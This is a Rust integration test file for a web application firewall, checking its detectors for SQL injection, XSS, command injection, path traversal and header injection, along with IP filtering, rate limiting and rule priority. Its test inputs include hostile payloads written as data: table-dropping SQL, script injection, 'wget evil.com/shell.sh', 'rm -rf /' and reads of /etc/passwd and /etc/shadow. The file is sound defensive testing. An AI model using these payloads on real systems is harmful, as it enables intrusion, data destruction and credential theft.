//! Cross-module integration tests.

#![allow(
    clippy::doc_markdown,
    clippy::assertions_on_constants,
    clippy::suboptimal_flops,
    clippy::unreadable_literal,
    clippy::float_cmp,
    clippy::similar_names,
    clippy::needless_collect,
    clippy::case_sensitive_file_extension_comparisons,
    clippy::redundant_clone
)]

use std::collections::HashMap;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::time::Duration;

use crate::action::*;
use crate::detection::*;
use crate::inspector::*;
use crate::ip_filter::*;
use crate::rate_limit::*;
use crate::request::*;
use crate::rule::*;
use crate::waf::*;

// -- Verdict --

#[test]
fn verdict_allow_has_no_rule() {
    let v = Verdict::allow();
    assert_eq!(v.action, Action::Allow);
    assert!(v.matched_rule.is_none());
    assert!(v.reason.is_none());
}

#[test]
fn verdict_block_has_rule_and_reason() {
    let v = Verdict::block("r1", "bad");
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("r1"));
    assert_eq!(v.reason.as_deref(), Some("bad"));
}

#[test]
fn verdict_log_has_rule_and_reason() {
    let v = Verdict::log("r2", "suspicious");
    assert_eq!(v.action, Action::Log);
    assert_eq!(v.matched_rule.as_deref(), Some("r2"));
}

// -- Request --

#[test]
fn request_builder() {
    let r = Request::new("POST", "/api")
        .with_header("Content-Type", "application/json")
        .with_body("{}")
        .with_ip(IpAddr::V4(Ipv4Addr::LOCALHOST));
    assert_eq!(r.method, "POST");
    assert_eq!(r.uri, "/api");
    assert_eq!(r.body, "{}");
    assert!(r.source_ip.is_some());
    assert_eq!(r.headers.get("content-type").unwrap(), "application/json");
}

// -- SQL Injection --

#[test]
fn sqli_or_1_eq_1() {
    assert!(detect_sqli("' OR '1'='1").is_some());
}

#[test]
fn sqli_union_select() {
    assert!(detect_sqli("1 UNION SELECT * FROM users").is_some());
}

#[test]
fn sqli_drop_table() {
    assert!(detect_sqli("'; DROP TABLE users--").is_some());
}

#[test]
fn sqli_delete_from() {
    assert!(detect_sqli("'; DELETE FROM users--").is_some());
}

#[test]
fn sqli_insert_into() {
    assert!(detect_sqli("'; INSERT INTO users VALUES('x')").is_some());
}

#[test]
fn sqli_benchmark() {
    assert!(detect_sqli("1 AND BENCHMARK(10000000,SHA1('test'))").is_some());
}

#[test]
fn sqli_sleep() {
    assert!(detect_sqli("1 AND SLEEP(5)").is_some());
}

#[test]
fn sqli_information_schema() {
    assert!(detect_sqli("SELECT * FROM information_schema.tables").is_some());
}

#[test]
fn sqli_load_file() {
    assert!(detect_sqli("LOAD_FILE('/etc/passwd')").is_some());
}

#[test]
fn sqli_into_outfile() {
    assert!(detect_sqli("SELECT * INTO OUTFILE '/tmp/x'").is_some());
}

#[test]
fn sqli_clean_input() {
    assert!(detect_sqli("SELECT name FROM products WHERE id=5").is_none());
}

#[test]
fn sqli_normal_text() {
    assert!(detect_sqli("Hello world, this is normal text").is_none());
}

#[test]
fn sqli_order_by() {
    assert!(detect_sqli("1 ORDER BY 1--").is_some());
}

#[test]
fn sqli_having() {
    assert!(detect_sqli("1 HAVING 1=1").is_some());
}

#[test]
fn sqli_waitfor() {
    assert!(detect_sqli("'; WAITFOR DELAY '00:00:05'").is_some());
}

#[test]
fn sqli_concat() {
    assert!(detect_sqli("CONCAT(username, password)").is_some());
}

#[test]
fn sqli_char() {
    assert!(detect_sqli("CHAR(60,115,99)").is_some());
}

#[test]
fn sqli_hex() {
    assert!(detect_sqli("0x414243").is_some());
}

// -- XSS --

#[test]
fn xss_script_tag() {
    assert!(detect_xss("<script>alert('xss')</script>").is_some());
}

#[test]
fn xss_onerror() {
    assert!(detect_xss("<img onerror=alert(1) src=x>").is_some());
}

#[test]
fn xss_onload() {
    assert!(detect_xss("<body onload=alert(1)>").is_some());
}

#[test]
fn xss_javascript_uri() {
    assert!(detect_xss("javascript:alert(1)").is_some());
}

#[test]
fn xss_iframe() {
    assert!(detect_xss("<iframe src='evil.com'>").is_some());
}

#[test]
fn xss_document_cookie() {
    assert!(detect_xss("document.cookie").is_some());
}

#[test]
fn xss_document_write() {
    assert!(detect_xss("document.write('<h1>hi</h1>')").is_some());
}

#[test]
fn xss_eval() {
    assert!(detect_xss("eval('alert(1)')").is_some());
}

#[test]
fn xss_innerhtml() {
    assert!(detect_xss("el.innerHTML = '<img>'").is_some());
}

#[test]
fn xss_fromcharcode() {
    assert!(detect_xss("String.fromCharCode(60,115)").is_some());
}

#[test]
fn xss_vbscript() {
    assert!(detect_xss("vbscript:msgbox").is_some());
}

#[test]
fn xss_data_text_html() {
    assert!(detect_xss("data:text/html,<script>alert(1)</script>").is_some());
}

#[test]
fn xss_onclick() {
    assert!(detect_xss("<div onclick=alert(1)>").is_some());
}

#[test]
fn xss_onmouseover() {
    assert!(detect_xss("<a onmouseover=alert(1)>link</a>").is_some());
}

#[test]
fn xss_settimeout() {
    assert!(detect_xss("setTimeout('alert(1)',0)").is_some());
}

#[test]
fn xss_clean_input() {
    assert!(detect_xss("Hello, this is normal HTML content").is_none());
}

#[test]
fn xss_object_tag() {
    assert!(detect_xss("<object data='evil.swf'>").is_some());
}

#[test]
fn xss_embed_tag() {
    assert!(detect_xss("<embed src='evil.swf'>").is_some());
}

// -- Command Injection --

#[test]
fn cmd_injection_semicolon_ls() {
    assert!(detect_command_injection("; ls -la").is_some());
}

#[test]
fn cmd_injection_pipe_cat() {
    assert!(detect_command_injection("| cat /etc/passwd").is_some());
}

#[test]
fn cmd_injection_dollar_paren() {
    assert!(detect_command_injection("$(whoami)").is_some());
}

#[test]
fn cmd_injection_backtick() {
    assert!(detect_command_injection("`id`").is_some());
}

#[test]
fn cmd_injection_wget() {
    assert!(detect_command_injection("; wget evil.com/shell.sh").is_some());
}

#[test]
fn cmd_injection_bin_sh() {
    assert!(detect_command_injection("/bin/sh -c 'ls'").is_some());
}

#[test]
fn cmd_injection_powershell() {
    assert!(detect_command_injection("powershell -exec bypass").is_some());
}

#[test]
fn cmd_injection_clean() {
    assert!(detect_command_injection("normal user input").is_none());
}

#[test]
fn cmd_injection_and_and_rm() {
    assert!(detect_command_injection("&& rm -rf /").is_some());
}

#[test]
fn cmd_injection_python() {
    assert!(detect_command_injection("; python -c 'import os'").is_some());
}

// -- Path Traversal --

#[test]
fn path_traversal_dot_dot_slash() {
    assert!(detect_path_traversal("../../etc/passwd").is_some());
}

#[test]
fn path_traversal_encoded() {
    assert!(detect_path_traversal("%2e%2e%2f%2e%2e%2fetc/passwd").is_some());
}

#[test]
fn path_traversal_etc_passwd() {
    assert!(detect_path_traversal("/etc/passwd").is_some());
}

#[test]
fn path_traversal_etc_shadow() {
    assert!(detect_path_traversal("/etc/shadow").is_some());
}

#[test]
fn path_traversal_windows() {
    assert!(detect_path_traversal("c:\\windows\\system32").is_some());
}

#[test]
fn path_traversal_proc_self() {
    assert!(detect_path_traversal("/proc/self/environ").is_some());
}

#[test]
fn path_traversal_clean() {
    assert!(detect_path_traversal("/api/users/123").is_none());
}

// -- Header Injection --

#[test]
fn header_injection_crlf() {
    assert!(detect_header_injection("value\r\nSet-Cookie: evil").is_some());
}

#[test]
fn header_injection_encoded() {
    assert!(detect_header_injection("value%0d%0aSet-Cookie: evil").is_some());
}

#[test]
fn header_injection_clean() {
    assert!(detect_header_injection("normal-header-value").is_none());
}

// -- IP Filter --

#[test]
fn ip_filter_blocklist() {
    let mut f = IpFilter::new();
    let ip: IpAddr = "192.168.1.100".parse().unwrap();
    f.add_to_blocklist(ip);
    assert_eq!(f.check(&ip), Action::Block);
    assert!(f.is_blocked(&ip));
}

#[test]
fn ip_filter_allowlist_only() {
    let mut f = IpFilter::new();
    let allowed: IpAddr = "10.0.0.1".parse().unwrap();
    let other: IpAddr = "10.0.0.2".parse().unwrap();
    f.add_to_allowlist(allowed);
    f.set_allowlist_only(true);
    assert_eq!(f.check(&allowed), Action::Allow);
    assert_eq!(f.check(&other), Action::Block);
}

#[test]
fn ip_filter_blocklist_overrides_allowlist() {
    let mut f = IpFilter::new();
    let ip: IpAddr = "10.0.0.1".parse().unwrap();
    f.add_to_allowlist(ip);
    f.add_to_blocklist(ip);
    f.set_allowlist_only(true);
    assert_eq!(f.check(&ip), Action::Block);
}

#[test]
fn ip_filter_remove_from_blocklist() {
    let mut f = IpFilter::new();
    let ip: IpAddr = "1.2.3.4".parse().unwrap();
    f.add_to_blocklist(ip);
    assert!(f.is_blocked(&ip));
    f.remove_from_blocklist(&ip);
    assert!(!f.is_blocked(&ip));
}

#[test]
fn ip_filter_remove_from_allowlist() {
    let mut f = IpFilter::new();
    let ip: IpAddr = "1.2.3.4".parse().unwrap();
    f.add_to_allowlist(ip);
    assert!(f.is_allowed(&ip));
    f.remove_from_allowlist(&ip);
    assert!(!f.is_allowed(&ip));
}

#[test]
fn ip_filter_ipv6() {
    let mut f = IpFilter::new();
    let ip = IpAddr::V6(Ipv6Addr::new(0x2001, 0xdb8, 0, 0, 0, 0, 0, 1));
    f.add_to_blocklist(ip);
    assert_eq!(f.check(&ip), Action::Block);
}

#[test]
fn ip_filter_no_duplicate_add() {
    let mut f = IpFilter::new();
    let ip: IpAddr = "1.2.3.4".parse().unwrap();
    f.add_to_blocklist(ip);
    f.add_to_blocklist(ip);
    assert_eq!(f.blocklist.len(), 1);
}

// -- Rate Limiter --

#[test]
fn rate_limiter_allows_within_limit() {
    let limiter = RateLimiter::new(5, Duration::from_secs(60));
    let ip: IpAddr = "10.0.0.1".parse().unwrap();
    for _ in 0..5 {
        assert!(limiter.allow(&ip));
    }
}

#[test]
fn rate_limiter_blocks_over_limit() {
    let limiter = RateLimiter::new(3, Duration::from_secs(60));
    let ip: IpAddr = "10.0.0.1".parse().unwrap();
    for _ in 0..3 {
        assert!(limiter.allow(&ip));
    }
    assert!(!limiter.allow(&ip));
}

#[test]
fn rate_limiter_independent_ips() {
    let limiter = RateLimiter::new(2, Duration::from_secs(60));
    let ip1: IpAddr = "10.0.0.1".parse().unwrap();
    let ip2: IpAddr = "10.0.0.2".parse().unwrap();
    assert!(limiter.allow(&ip1));
    assert!(limiter.allow(&ip1));
    assert!(!limiter.allow(&ip1));
    assert!(limiter.allow(&ip2));
}

#[test]
fn rate_limiter_remaining() {
    let limiter = RateLimiter::new(5, Duration::from_secs(60));
    let ip: IpAddr = "10.0.0.1".parse().unwrap();
    assert_eq!(limiter.remaining(&ip), 5);
    limiter.allow(&ip);
    assert_eq!(limiter.remaining(&ip), 4);
}

#[test]
fn rate_limiter_reset() {
    let limiter = RateLimiter::new(2, Duration::from_secs(60));
    let ip: IpAddr = "10.0.0.1".parse().unwrap();
    limiter.allow(&ip);
    limiter.allow(&ip);
    assert!(!limiter.allow(&ip));
    limiter.reset();
    assert!(limiter.allow(&ip));
}

// -- Request Inspector --

#[test]
fn inspector_default_methods() {
    let i = RequestInspector::new();
    assert!(i.check_method("GET"));
    assert!(i.check_method("POST"));
    assert!(i.check_method("put"));
    assert!(!i.check_method("CUSTOM"));
}

#[test]
fn inspector_body_size() {
    let mut i = RequestInspector::new();
    i.max_body_size = 10;
    assert!(i.check_body_size("short"));
    assert!(!i.check_body_size("this is definitely over ten bytes"));
}

#[test]
fn inspector_required_headers() {
    let mut i = RequestInspector::new();
    i.required_headers = vec!["authorization".into(), "x-request-id".into()];
    let mut headers = HashMap::new();
    headers.insert("authorization".into(), "Bearer xxx".into());
    let missing = i.check_required_headers(&headers);
    assert_eq!(missing, vec!["x-request-id"]);
}

#[test]
fn inspector_content_type_valid() {
    let mut i = RequestInspector::new();
    i.allowed_content_types = vec!["application/json".into()];
    let mut headers = HashMap::new();
    headers.insert(
        "content-type".into(),
        "application/json; charset=utf-8".into(),
    );
    assert_eq!(i.check_content_type(&headers), ContentTypeCheck::Valid);
}

#[test]
fn inspector_content_type_invalid() {
    let mut i = RequestInspector::new();
    i.allowed_content_types = vec!["application/json".into()];
    let mut headers = HashMap::new();
    headers.insert("content-type".into(), "text/plain".into());
    assert!(matches!(
        i.check_content_type(&headers),
        ContentTypeCheck::Invalid(_)
    ));
}

#[test]
fn inspector_content_type_missing() {
    let mut i = RequestInspector::new();
    i.allowed_content_types = vec!["application/json".into()];
    let headers = HashMap::new();
    assert_eq!(i.check_content_type(&headers), ContentTypeCheck::Missing);
}

#[test]
fn inspector_no_content_type_restriction() {
    let i = RequestInspector::new();
    let headers = HashMap::new();
    assert_eq!(i.check_content_type(&headers), ContentTypeCheck::Valid);
}

// -- Pattern --

#[test]
fn pattern_contains() {
    let p = Pattern::Contains("evil".into());
    assert!(p.matches("this is evil stuff"));
    assert!(!p.matches("this is good stuff"));
}

#[test]
fn pattern_case_insensitive() {
    let p = Pattern::ContainsCaseInsensitive("EVIL".into());
    assert!(p.matches("this is evil stuff"));
}

#[test]
fn pattern_exact() {
    let p = Pattern::Exact("hello".into());
    assert!(p.matches("hello"));
    assert!(!p.matches("hello world"));
}

#[test]
fn pattern_starts_with() {
    let p = Pattern::StartsWith("/admin".into());
    assert!(p.matches("/admin/panel"));
    assert!(!p.matches("/user/admin"));
}

#[test]
fn pattern_ends_with() {
    let p = Pattern::EndsWith(".php".into());
    assert!(p.matches("index.php"));
    assert!(!p.matches("index.html"));
}

#[test]
fn pattern_any_of() {
    let p = Pattern::AnyOf(vec!["bad".into(), "evil".into()]);
    assert!(p.matches("something bad"));
    assert!(p.matches("something EVIL"));
    assert!(!p.matches("something good"));
}

#[test]
fn pattern_custom() {
    let p = Pattern::Custom(|s| s.len() > 10);
    assert!(p.matches("this is long enough"));
    assert!(!p.matches("short"));
}

// -- Rule --

#[test]
fn rule_matches_uri() {
    let rule = Rule {
        id: "r1".into(),
        description: "block admin".into(),
        target: RuleTarget::Uri,
        pattern: Pattern::StartsWith("/admin".into()),
        action: Action::Block,
        priority: 1,
        enabled: true,
    };
    let req = Request::new("GET", "/admin/panel");
    assert!(rule.check(&req));
}

#[test]
fn rule_disabled_does_not_match() {
    let rule = Rule {
        id: "r1".into(),
        description: "block admin".into(),
        target: RuleTarget::Uri,
        pattern: Pattern::StartsWith("/admin".into()),
        action: Action::Block,
        priority: 1,
        enabled: false,
    };
    let req = Request::new("GET", "/admin/panel");
    assert!(!rule.check(&req));
}

#[test]
fn rule_matches_body() {
    let rule = Rule {
        id: "r2".into(),
        description: "block bad body".into(),
        target: RuleTarget::Body,
        pattern: Pattern::Contains("malicious".into()),
        action: Action::Block,
        priority: 1,
        enabled: true,
    };
    let req = Request::new("POST", "/api").with_body("this is malicious data");
    assert!(rule.check(&req));
}

#[test]
fn rule_matches_header() {
    let rule = Rule {
        id: "r3".into(),
        description: "block bad ua".into(),
        target: RuleTarget::Header("user-agent".into()),
        pattern: Pattern::ContainsCaseInsensitive("sqlmap".into()),
        action: Action::Block,
        priority: 1,
        enabled: true,
    };
    let req = Request::new("GET", "/").with_header("User-Agent", "sqlmap/1.0");
    assert!(rule.check(&req));
}

#[test]
fn rule_matches_any_field() {
    let rule = Rule {
        id: "r4".into(),
        description: "block keyword".into(),
        target: RuleTarget::AnyField,
        pattern: Pattern::ContainsCaseInsensitive("forbidden".into()),
        action: Action::Block,
        priority: 1,
        enabled: true,
    };
    let req = Request::new("GET", "/ok").with_body("this is forbidden");
    assert!(rule.check(&req));
}

#[test]
fn rule_matches_method() {
    let rule = Rule {
        id: "r5".into(),
        description: "block TRACE".into(),
        target: RuleTarget::Method,
        pattern: Pattern::Exact("TRACE".into()),
        action: Action::Block,
        priority: 1,
        enabled: true,
    };
    let req = Request::new("TRACE", "/");
    assert!(rule.check(&req));
}

// -- WAF Engine --

#[test]
fn waf_default_allows_clean_request() {
    let waf = Waf::new();
    let req = Request::new("GET", "/index.html");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Allow);
}

#[test]
fn waf_blocks_sqli_in_uri() {
    let waf = Waf::new();
    let req = Request::new("GET", "/search?q=' OR '1'='1");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("sqli"));
}

#[test]
fn waf_blocks_sqli_in_body() {
    let waf = Waf::new();
    let req = Request::new("POST", "/login").with_body("username=admin&password=' OR 1=1--");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
}

#[test]
fn waf_blocks_xss_in_body() {
    let waf = Waf::new();
    let req = Request::new("POST", "/comment").with_body("<script>alert('xss')</script>");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("xss"));
}

#[test]
fn waf_blocks_xss_in_uri() {
    let waf = Waf::new();
    let req = Request::new("GET", "/page?name=<script>alert(1)</script>");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
}

#[test]
fn waf_blocks_command_injection() {
    let waf = Waf::new();
    let req = Request::new("POST", "/exec").with_body("input=; ls -la");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("cmd-injection"));
}

#[test]
fn waf_blocks_path_traversal() {
    let waf = Waf::new();
    let req = Request::new("GET", "/files/../../etc/passwd");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("path-traversal"));
}

#[test]
fn waf_blocks_header_injection() {
    let waf = Waf::new();
    let req = Request::new("GET", "/").with_header("x-custom", "value\r\nSet-Cookie: evil=1");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("header-injection"));
}

#[test]
fn waf_blocks_ip() {
    let mut waf = Waf::new();
    let ip: IpAddr = "192.168.1.100".parse().unwrap();
    waf.ip_filter_mut().add_to_blocklist(ip);
    let req = Request::new("GET", "/").with_ip(ip);
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("ip-filter"));
}

#[test]
fn waf_rate_limit() {
    let mut waf = Waf::new();
    waf.set_rate_limiter(RateLimiter::new(2, Duration::from_secs(60)));
    let ip: IpAddr = "10.0.0.1".parse().unwrap();
    let req = Request::new("GET", "/").with_ip(ip);
    assert_eq!(waf.inspect(&req).action, Action::Allow);
    assert_eq!(waf.inspect(&req).action, Action::Allow);
    assert_eq!(waf.inspect(&req).action, Action::Block);
}

#[test]
fn waf_method_not_allowed() {
    let mut waf = Waf::new();
    waf.inspector_mut().allowed_methods = vec!["GET".into(), "POST".into()];
    let req = Request::new("TRACE", "/");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("method-check"));
}

#[test]
fn waf_body_too_large() {
    let mut waf = Waf::new();
    waf.inspector_mut().max_body_size = 10;
    let req = Request::new("POST", "/").with_body("a]".repeat(20).as_str());
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("body-size"));
}

#[test]
fn waf_missing_required_header() {
    let mut waf = Waf::new();
    waf.inspector_mut().required_headers = vec!["authorization".into()];
    let req = Request::new("GET", "/api");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("required-headers"));
}

#[test]
fn waf_content_type_check() {
    let mut waf = Waf::new();
    waf.inspector_mut().allowed_content_types = vec!["application/json".into()];
    let req = Request::new("POST", "/api").with_header("content-type", "text/html");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("content-type"));
}

#[test]
fn waf_custom_rule_block() {
    let mut waf = Waf::new();
    waf.add_rule(Rule {
        id: "block-admin".into(),
        description: "No admin access".into(),
        target: RuleTarget::Uri,
        pattern: Pattern::StartsWith("/admin".into()),
        action: Action::Block,
        priority: 1,
        enabled: true,
    });
    let req = Request::new("GET", "/admin/settings");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("block-admin"));
}

#[test]
fn waf_custom_rule_log() {
    let mut waf = Waf::new();
    waf.add_rule(Rule {
        id: "log-api".into(),
        description: "Log API calls".into(),
        target: RuleTarget::Uri,
        pattern: Pattern::StartsWith("/api".into()),
        action: Action::Log,
        priority: 1,
        enabled: true,
    });
    let req = Request::new("GET", "/api/users");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Log);
}

#[test]
fn waf_custom_rule_allow() {
    let mut waf = Waf::new();
    waf.add_rule(Rule {
        id: "allow-health".into(),
        description: "Always allow health".into(),
        target: RuleTarget::Uri,
        pattern: Pattern::Exact("/health".into()),
        action: Action::Allow,
        priority: 0,
        enabled: true,
    });
    let req = Request::new("GET", "/health");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Allow);
}

#[test]
fn waf_rule_priority_order() {
    let mut waf = Waf::new();
    waf.add_rule(Rule {
        id: "low-priority".into(),
        description: "low".into(),
        target: RuleTarget::Uri,
        pattern: Pattern::StartsWith("/test".into()),
        action: Action::Log,
        priority: 10,
        enabled: true,
    });
    waf.add_rule(Rule {
        id: "high-priority".into(),
        description: "high".into(),
        target: RuleTarget::Uri,
        pattern: Pattern::StartsWith("/test".into()),
        action: Action::Block,
        priority: 1,
        enabled: true,
    });
    let req = Request::new("GET", "/test");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("high-priority"));
}

#[test]
fn waf_remove_rule() {
    let mut waf = Waf::new();
    waf.add_rule(Rule {
        id: "r1".into(),
        description: "test".into(),
        target: RuleTarget::Uri,
        pattern: Pattern::Contains("x".into()),
        action: Action::Block,
        priority: 1,
        enabled: true,
    });
    assert_eq!(waf.rule_count(), 1);
    waf.remove_rule("r1");
    assert_eq!(waf.rule_count(), 0);
}

#[test]
fn waf_disable_sqli_detection() {
    let mut waf = Waf::new();
    waf.sqli_detection = false;
    let req = Request::new("GET", "/search?q=' OR '1'='1");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Allow);
}

#[test]
fn waf_disable_xss_detection() {
    let mut waf = Waf::new();
    waf.xss_detection = false;
    let req = Request::new("POST", "/").with_body("<script>alert(1)</script>");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Allow);
}

#[test]
fn waf_disable_cmd_injection_detection() {
    let mut waf = Waf::new();
    waf.cmd_injection_detection = false;
    let req = Request::new("POST", "/").with_body("; rm -rf /");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Allow);
}

#[test]
fn waf_disable_path_traversal_detection() {
    let mut waf = Waf::new();
    waf.path_traversal_detection = false;
    let req = Request::new("GET", "/../../etc/passwd");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Allow);
}

#[test]
fn waf_ip_checked_before_rules() {
    let mut waf = Waf::new();
    let ip: IpAddr = "1.2.3.4".parse().unwrap();
    waf.ip_filter_mut().add_to_blocklist(ip);
    waf.add_rule(Rule {
        id: "allow-all".into(),
        description: "allow".into(),
        target: RuleTarget::AnyField,
        pattern: Pattern::Custom(|_| true),
        action: Action::Allow,
        priority: 0,
        enabled: true,
    });
    let req = Request::new("GET", "/").with_ip(ip);
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("ip-filter"));
}

#[test]
fn waf_no_ip_skips_ip_check() {
    let mut waf = Waf::new();
    let ip: IpAddr = "1.2.3.4".parse().unwrap();
    waf.ip_filter_mut().add_to_blocklist(ip);
    let req = Request::new("GET", "/");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Allow);
}

#[test]
fn waf_default_is_new() {
    let waf = Waf::default();
    assert_eq!(waf.rule_count(), 0);
    assert!(waf.sqli_detection);
    assert!(waf.xss_detection);
}

#[test]
fn waf_sqli_union_all_select() {
    let waf = Waf::new();
    let req = Request::new(
        "GET",
        "/data?id=1 UNION ALL SELECT username,password FROM users",
    );
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
}

#[test]
fn waf_xss_in_header() {
    let waf = Waf::new();
    let req = Request::new("GET", "/").with_header("x-data", "<script>alert(1)</script>");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
}

#[test]
fn waf_multiple_attacks_first_wins() {
    let waf = Waf::new();
    let req = Request::new("GET", "/../../etc/passwd?q=' OR 1=1--");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
}

#[test]
fn waf_content_type_missing_when_required() {
    let mut waf = Waf::new();
    waf.inspector_mut().allowed_content_types = vec!["application/json".into()];
    let req = Request::new("POST", "/api").with_body("{}");
    let v = waf.inspect(&req);
    assert_eq!(v.action, Action::Block);
    assert_eq!(v.matched_rule.as_deref(), Some("content-type"));
}
